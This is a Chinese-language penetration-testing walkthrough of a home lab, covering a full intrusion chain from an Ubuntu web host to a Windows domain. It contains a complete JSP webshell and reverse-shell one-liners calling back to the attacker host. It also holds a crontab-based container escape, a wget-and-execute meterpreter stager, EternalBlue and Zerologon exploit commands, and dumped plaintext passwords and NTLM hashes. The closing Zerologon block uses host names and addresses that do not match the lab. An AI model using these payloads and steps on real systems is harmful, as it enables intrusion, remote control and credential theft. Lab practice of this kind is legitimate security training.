

| 虚拟机 | 网卡 1 | 网卡 2 | 账号密码 |
| --- | --- | --- | --- |
| web（Ubuntu 边界跳板） | VMnet8 (NAT，外网) | VMnet1 (仅主机，内网域) | `ubuntu / ubuntu` |
| win7（域成员） | VMnet1 (仅主机) | 无 | `douser / Dotest123` |
| DC（域控） | VMnet1 (仅主机) | 无 | `Administrator / Test2008` |
| Kali 攻击机 | VMnet8(NAT) | 无 | `root / kali` |


```plain
cd ~/Desktop/vulhub/struts2/s2-045 && sudo docker-compose up -d
cd ~/Desktop/vulhub/tomcat/CVE-2017-12615 && sudo docker-compose up -d
cd ~/Desktop/vulhub/phpmyadmin/CVE-2018-12613 && sudo docker-compose up -d
```

# getshell
目标web`192.168.233.130`

**信息收集**

```plain
┌──(root㉿kali)-[~]
└─# nmap -Pn -sV 192.168.233.130 -p-
Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-14 05:02 -0400
Nmap scan report for 192.168.233.130
Host is up (0.00077s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
2001/tcp open  http    Jetty 9.2.11.v20150529
2002/tcp open  http    Apache Tomcat 8.5.19
2003/tcp open  http    Apache httpd 2.4.25 ((Debian))
MAC Address: 00:0C:29:5A:D7:7E (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.14 seconds

```

结果	开启三个端口,三个服务

```plain
2001/tcp open  http    Jetty 9.2.11.v20150529
2002/tcp open  http    Apache Tomcat 8.5.19
2003/tcp open  http    Apache httpd 2.4.25 ((Debian))
```

更详细的扫描

```plain
nmap -p- -n -O -A -Pn -v -sV 192.168.233.130
```

结果

```plain
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 6d:1e:e7:55:ee:d7:2b:22:d7:6b:68:67:df:39:f5:7b (DSA)
|   2048 5e:ca:2c:70:8f:a2:0c:bf:10:d7:26:2b:15:5f:3f:58 (RSA)
|   256 de:b5:6a:a8:24:6a:13:45:cc:87:21:c3:c2:ee:b2:10 (ECDSA)
|_  256 8e:02:ca:99:6e:c2:eb:8f:0c:5c:bb:c9:b2:f5:06:4d (ED25519)
2001/tcp open  http    Jetty 9.2.11.v20150529
|_http-title: Struts2 Showcase - Fileupload sample
| http-cookie-flags: 
|   /: 
|     JSESSIONID: 
|_      httponly flag not set
|_http-server-header: Jetty(9.2.11.v20150529)
| http-methods: 
|_  Supported Methods: GET HEAD POST
2002/tcp open  http    Apache Tomcat 8.5.19
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/8.5.19
2003/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: 192.168.233.130:2003 / mysql | phpMyAdmin 4.8.1
| http-robots.txt: 1 disallowed entry 
|_/
|_http-favicon: Unknown favicon MD5: 531B63A51234BB06C9D77F219EB25553
```

+ 2001端口标题Struts2,<font style="color:rgb(15, 17, 21);">极可能存在 </font>**<font style="color:rgb(15, 17, 21);">S2-045 (CVE-2017-5638)</font>**<font style="color:rgb(15, 17, 21);"> 远程代码执行漏洞</font>
+ <font style="color:rgb(15, 17, 21);">2002:tomcat可能存在已知漏洞</font>
+ <font style="color:rgb(15, 17, 21);">2003:phpMyAdmin 4.8.1 存在多个高危漏洞，最著名的是 </font>**<font style="color:rgb(15, 17, 21);">CVE-2018-12613</font>**

**漏洞扫描**

```plain
nmap --script=vuln -p2001 192.168.233.130 -sV
```

```plain
#结果
| http-vuln-cve2017-5638: 
|   VULNERABLE:
|   Apache Struts Remote Code Execution Vulnerability
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-5638
|       Apache Struts 2.3.5 - Struts 2.3.31 and Apache Struts 2.5 - Struts 2.5.10 are vulnerable to a Remote Code 
```

+ cve2017-5638状态VULNERABLE

```plain
nmap --script=vuln -p2002 192.168.233.130 -sV
```

+ CVE-2017-12615（PUT 任意文件上传）
+ CVE-2020-1938（Ghostcat）—— AJP 文件读取/包含 但无法直接利用

## **<font style="color:rgb(15, 17, 21);">S2-045 (CVE-2017-5638)</font>**
**<font style="color:rgb(15, 17, 21);">验证漏洞</font>**

<font style="color:rgb(15, 17, 21);">使用公开poc</font>

```plain
git clone https://github.com/kloutkake/CVE-2017-5638-PoC.git

# 1. 在当前目录下创建一个隔离环境
python3 -m venv .venv
# 2. 激活这个环境（激活后，终端提示符前会出现 (.venv)）
source .venv/bin/activate


pip install -r PoC/requirements.txt
python3 PoC/exploit.py --check -u http://192.168.233.130:2001
#输出[*] Status: Vulnerable!
```

**利用漏洞执行命令**

```plain
python3 PoC/exploit.py  -u http://192.168.233.130:2001/doUpload.action --cmd -d
#但总是被重置连接
(venv)root@kali:~/CVE-2017-5638-PoC# python3 PoC/exploit.py  -u http://192.168.233.130:2001/doUpload.action --cmd id

[*] URL: http://192.168.233.130:2001/doUpload.action
[*] CMD: id
Error: ("Connection broken: ConnectionResetError(104, 'Connection reset by peer')", ConnectionResetError(104, 'Connection reset by peer'))
False
[*] Done.

```

换工具

```plain
https://github.com/abc123info/Struts2VulsScanTools
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1786770661847-5962c205-c28f-45c3-8ce9-a201e398f106.png)

可执行命令

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1786770696902-17d27d4b-bf65-475f-bd27-945717b3c6f7.png)

**反弹shell**

kali开启监听

```plain
nc -lvnp 6666
```

工具中执行反弹shell

但是执行反弹命令没有反应

**上传木马**

蚁剑生成jsp木马

```plain
<%-- 使用时请删除此行, 连接密码: eWUiGZzB --%>
<%!
class MONOMORPHIC extends ClassLoader{
  MONOMORPHIC(ClassLoader c){super(c);}
  public Class fractal(byte[] b){
    return super.defineClass(b, 0, b.length);
  }
}
public byte[] helper(String str) throws Exception {
  Class base64;
  byte[] value = null;
  try {
    base64=Class.forName("sun.misc.BASE64Decoder");
    Object decoder = base64.newInstance();
    value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] {String.class }).invoke(decoder, new Object[] { str });
  } catch (Exception e) {
    try {
      base64=Class.forName("java.util.Base64");
      Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
      value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { str });
    } catch (Exception ee) {}
  }
  return value;
}
%>
<%
String cls = request.getParameter("eWUiGZzB");
if (cls != null) {
  new MONOMORPHIC(this.getClass().getClassLoader()).fractal(helper(cls)).newInstance().equals(new Object[]{request,response});
}
%>

```

上传成功

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1786771491299-6ae706db-6a6c-45be-b9e9-7d933b1bc5cb.png)

尝试蚁剑连接

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1786774084721-c41b8180-de49-420a-9984-3814c6461f48.png)

成功getshell

反弹shell

```plain
bash -i >& /dev/tcp/192.168.233.130/6666 0>&1
#/bin/sh: 1: Syntax error: Bad fd number
#蚁剑默认shell是/bin/bash

nc -e /bin/sh 192.168.233.129 6666
#/bin/sh: 1: nc: not found
#没有安装nc

#用python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.233.129",6666));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
#python没有安装
```

暂时先不反弹shell

## <font style="color:rgb(15, 17, 21);">Tomcat CVE-2017-12615 PUT 上传</font>
kali中

```plain
#用2001利用的木马,写在shell.jsp
#上传木马
curl -v -X PUT --data-binary @shell.jsp \
  http://192.168.233.130:2002/shell.jsp/
```

成功上传

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1786784495252-00f678e4-7163-45af-acc3-36a270fe912a.png)

蚁剑连接

```plain
#确认在容器中
(root:/usr/src) $ ls -la /.dockerenv
-rwxr-xr-x 1 root root 0 Jan 22  2020 /.dockerenv

```

# 容器逃逸--拿下ubuntu
**2001**

**确认是否具备逃逸条件**

```plain
#检查容器能力
cat /proc/self/status | grep Cap
#重点看 CapEff 的十六进制值

#检查是否挂载了docker socket
ls -la /var/run/docker.sock

#检查权限模式与设备访问
lsblk
ls -l /dev/sd*/
#如果挂载失败，说明缺少 CAP_SYS_ADMIN 或设备节点不可访问

#检查挂载点
mount

#检查是否有内核漏洞可以逃逸
uname -a
```

侦察发现不具备容器逃逸权限

**2002**

**确认是否可逃逸**

```plain
(root:/usr/src) $ cat /proc/self/status | grep Cap
CapInh:    0000003fffffffff
CapPrm:    0000003fffffffff
CapEff:    0000003fffffffff
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

(root:/usr/src) $ lsblk
NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
sda      8:0    0   10G  0 disk 
├─sda1   8:1    0    8G  0 part /etc/hosts
├─sda2   8:2    0    1K  0 part 
└─sda5   8:5    0    2G  0 part [SWAP]
sr0     11:0    1 1024M  0 rom  
(root:/usr/src) $ ls -l /dev/sd*
brw-rw---- 1 root disk 8, 0 Aug 14 09:02 /dev/sda
brw-rw---- 1 root disk 8, 1 Aug 14 09:02 /dev/sda1
brw-rw---- 1 root disk 8, 2 Aug 14 09:02 /dev/sda2
brw-rw---- 1 root disk 8, 5 Aug 14 09:02 /dev/sda5
```

可挂载磁盘逃逸

**挂载磁盘**

```plain
#创建挂载点
mkdir /mnt/host

#执行挂载
mount /dev/sda1 /mnt/host

#验证
ls -la /mnt/host
```

**写入crontab反弹shell完成逃逸**

```plain
#kali监听
nc -lvnp 4444

#webshell中
echo '* * * * * root /bin/bash -c "bash -i >& /dev/tcp/192.168.233.129/4444 0>&1"' >> /mnt/host/etc/crontab
#验证是否写入
tail -n 2 /mnt/host/etc/crontab
```

拿到反弹shell

# 内网信息搜集
kali如何无法访问扫描内网

在kali上上传fscan给ubuntu

```plain
#kali
python -m http.server

#反弹shell中
wget http://192.168.233.129:8000/fscan
chmod +x fscan
./fscan -h 192.168.183.0/24
```

结果

```plain
[*] 扫描完成，发现 15 个开放端口
[*] 存活主机数: 4
[+] NetInfo 192.168.183.129:135 [TESTWIN7-PC]
[+] NetInfo 192.168.183.129:135   -> 192.168.183.129
[+] NetInfo 192.168.183.130:135 [WIN-ENS2VR5TR3N]
[+] NetInfo 192.168.183.130:135   -> 192.168.183.130
[-] 192.168.183.1:3306 mysql 未发现弱密码
[-] 192.168.183.129:445 smb 未发现弱密码
[-] 192.168.183.128:22 ssh 未发现弱密码
[*] 扫描任务完成，耗时 1m49.159s，已扫描 37 个目标

```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1786797543413-07089434-d5f8-47b6-8c87-9f96c2ac3226.png)

# 建立内网路由
**反弹meterpreter会话给msf**

msf执行

```plain
use multi/script/web_delivery

msf exploit(multi/script/web_delivery) > set target 7
target => 7
msf exploit(multi/script/web_delivery) > set LHOST 192.168.233.129
LHOST => 192.168.233.129
msf exploit(multi/script/web_delivery) > set payload 10
payload => linux/x64/meterpreter/reverse_tcp
```

得到命令,ubuntu执行

```plain
wget -qO oYZUaBXK --no-check-certificate http://192.168.233.129:8080/4fORGU4; chmod +x oYZUaBXK; ./oYZUaBXK& disown
```

得到会话

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1786798265465-7f2ca10f-6028-4dd2-8859-1cdb362abded.png)

**添加路由**

```plain
#进入会话
sessions -i 1
run autoroute -s 192.168.183.0/24
run autoroute -p
```

添加成功

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1786798974169-f25cc55a-e12d-4cb3-9c65-2e065b1e07e7.png)

**建立隧道**

```plain
use auxiliary/server/socks_proxy
set SRVPORT 1080
set VERSION 5
run
```

# 横向win7
前面扫描有永恒之蓝漏洞,用msf打

```plain
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.183.129
set PAYLOAD windows/x64/meterpreter/bind_tcp
set LPORT 4445
run
```

拿到win7会话

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1786859542555-59cd2239-5c7f-4cfc-9bde-7302191db127.png)

**抓取凭证**

```plain
meterpreter > creds_all
[+] Running as SYSTEM
[*] Retrieving all credentials
msv credentials
===============

Username      Domain  NTLM                              SHA1
--------      ------  ----                              ----
TESTWIN7-PC$  DEMO    e3ba914bdaca29c197c7191ebf521873  68a1422322c303e4c24d63f381a03b34eb434477
douser        DEMO    bc23b0b4d5bf5ff42bc61fb62e13886e  c48096437367aad00ac2dc70552051cd84912a55

wdigest credentials
===================

Username      Domain  Password
--------      ------  --------
(null)        (null)  (null)
TESTWIN7-PC$  DEMO    /-LDA[1d hf-tfj)O)yNyCgh[o#D[h7I/*-'ShnKX%X7`wWWdrLDd`!EUceLQ8:y!J?TD5KY*iuQ32i8He_D#JyWDW
                      IzuYDDytr)\J7(_e(Fctsjl.Zd"JRr
douser        DEMO    Dotest123

kerberos credentials
====================

Username      Domain    Password
--------      ------    --------
(null)        (null)    (null)
douser        DEMO.COM  (null)
testwin7-pc$  demo.com  /-LDA[1d hf-tfj)O)yNyCgh[o#D[h7I/*-'ShnKX%X7`wWWdrLDd`!EUceLQ8:y!J?TD5KY*iuQ32i8He_D#JyW
                        DWIzuYDDytr)\J7(_e(Fctsjl.Zd"JRr
testwin7-pc$  DEMO.COM  /-LDA[1d hf-tfj)O)yNyCgh[o#D[h7I/*-'ShnKX%X7`wWWdrLDd`!EUceLQ8:y!J?TD5KY*iuQ32i8He_D#JyW
                        DWIzuYDDytr)\J7(_e(Fctsjl.Zd"JRr
```

# 横向DC
## <font style="color:rgb(15, 17, 21);">MS14-068 Kerberos 票据伪造</font>
```plain
# 安装 impacket（通常 Kali 已预装）
cd /usr/share/doc/python3-impacket/examples/

# 生成并利用伪造票据，获取域控的 SYSTEM shell
python3 goldenPac.py DEMO.COM/douser:Dotest123@192.168.183.130 -dc-ip 192.168.183.130 -target-ip 192.168.183.130
```

但显示很多环境问题,太复杂,跳过

走Zerologon CVE-2020-1472路径

## <font style="color:rgb(15, 17, 21);">Zerologon CVE-2020-1472</font>
```plain
# Check (https://github.com/SecuraBV/CVE-2020-1472)
proxychains python3 zerologon_tester.py DC01 172.16.1.5

$ git clone https://github.com/dirkjanm/CVE-2020-1472.git

# Activate a virtual env to install impacket
$ python3 -m venv venv
$ source venv/bin/activate
$ pip3 install .

# Exploit the CVE (https://github.com/dirkjanm/CVE-2020-1472/blob/master/cve-2020-1472-exploit.py)
proxychains python3 cve-2020-1472-exploit.py DC01 172.16.1.5

# Find the old NT hash of the DC
proxychains secretsdump.py -history -just-dc-user 'DC01$' -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 'CORP/DC01$@DC01.CORP.LOCAL'

# Restore password from secretsdump 
# secretsdump will automatically dump the plaintext machine password (hex encoded) 
# when dumping the local registry secrets on the newest version
python restorepassword.py CORP/DC01@DC01.CORP.LOCAL -target-ip 172.16.1.5 -hexpass e6ad4c4f64e71cf8c8020aa44bbd70ee711b8dce2adecd7e0d7fd1d76d70a848c987450c5be97b230bd144f3c3
deactivate
```

